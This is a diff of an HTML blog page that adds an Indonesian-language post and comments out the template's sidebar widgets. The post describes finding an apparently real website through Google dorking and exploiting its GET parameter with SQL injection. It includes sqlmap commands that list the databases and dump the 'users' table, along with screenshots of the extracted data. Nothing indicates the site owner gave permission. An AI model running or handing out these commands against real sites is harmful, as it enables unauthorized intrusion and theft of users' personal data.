@@ -73,14 +73,14 @@
           <div class="blog-single-wrap">
             <div class="header">
               <div class="post-thumb">
-                <img src="../assets/img/blog/blog-1.jpg" alt="">
+                <img src="../assets/img/sql/sqlinject.jpg" alt="">
               </div>
               <div class="meta-header">
                 <div class="post-author">
                   <div class="avatar">
-                    <img src="../assets/img/person/person_1.jpg" alt="">
+                    <img src="../assets/img/sql/user.png" alt="">
                   </div>
-                  by <a href="#">Stephen Doe</a>
+                  by <a href="#">reharun</a>
                 </div>
 
                 <div class="post-sharer">
@@ -96,12 +96,12 @@
               <div class="post-date">
                 <span class="icon">
                   <span class="mai-time-outline"></span>
-                </span> <a href="#">March 10, 2020</a>
+                </span> <!--<a href="#">March 10, 2020</a> -->
               </div>
               <div class="post-comment-count ml-2">
                 <span class="icon">
                   <span class="mai-chatbubbles-outline"></span>
-                </span> <a href="#">4 Comments</a>
+                </span> 
               </div>
             </div>
             <div class="post-content">
@@ -116,8 +116,18 @@
             <div class="post-content">
               <p>Pada saat melakukan dorking dengan menggunakan syntax dari GHDB didapatkan adanay situs yang mempunyai celah untuk dilakukan SQL Injection:<br> </p>
                 <img src="../assets/img/sql/webnormal1.jpg" alt="" style="width:600px;height:100px;"> 
+               <p> hasil mengirimkan syntax SQL pada parameter, dapat dicoba seperti : ','',or,1 
                 <img src="../assets/img/sql/websyntax.jpg" alt="" style="width:600px;height:100px;"> 
-                
+                <p>Metode Exploitasi  Sqlmap dengan menggunakan command: <br>
+                   •sqlmap -u https://www.xxxx.co.id/detail_products.php?id=550 --random-agent --batch --dbs  </p>
+                <img src="../assets/img/sql/sqlmapparm.jpg" alt="" style="width:600px;height:100px;">
+                <p> maka dari  gambar diatas didapatkan Sql injection dengan parameter GET</p>
+                <p>Hasil eksploitasi :</p>
+                <img src="../assets/img/sql/DB.jpg" alt="" style="width:600px;height:200px;">
+                <p> lalu dilakukan cek ke file dari Database dengan : <br>
+                    •sqlmap -u https://www.xxxx.co.id/detail_products.php?id=550 --dbs -D nama DB -T users --columns -dump </p>
+                <p> Dan didapatkan isi dari database
+                <img src="../assets/img/sql/exploit.jpg" alt="">
             </div>
           </div>
 
@@ -160,8 +170,9 @@
                 <button type="submit" class="btn btn-primary btn-block">Search</button>
               </form>
             </div>
-
+            
             <!-- Widget Categories -->
+            <!--
             <div class="widget-box">
               <h4 class="widget-title">Category</h4>
               <div class="divider"></div>
@@ -174,8 +185,9 @@
                 <li><a href="#">Entertainment</a></li>
               </ul>
             </div>
-
+           
             <!-- Widget recent post -->
+            <!--
             <div class="widget-box">
               <h4 class="widget-title">Recent Post</h4>
               <div class="divider"></div>
@@ -223,8 +235,9 @@
               </div>
 
             </div>
-
+            -->
             <!-- Widget Tag Cloud -->
+            <!--
             <div class="widget-box">
               <h4 class="widget-title">Tag Cloud</h4>
               <div class="divider"></div>
@@ -239,7 +252,7 @@
                 <a href="#" class="tag-cloud-link">Food</a>
               </div>
             </div>
-
+            -->
           </div>
         </div>
       </div>
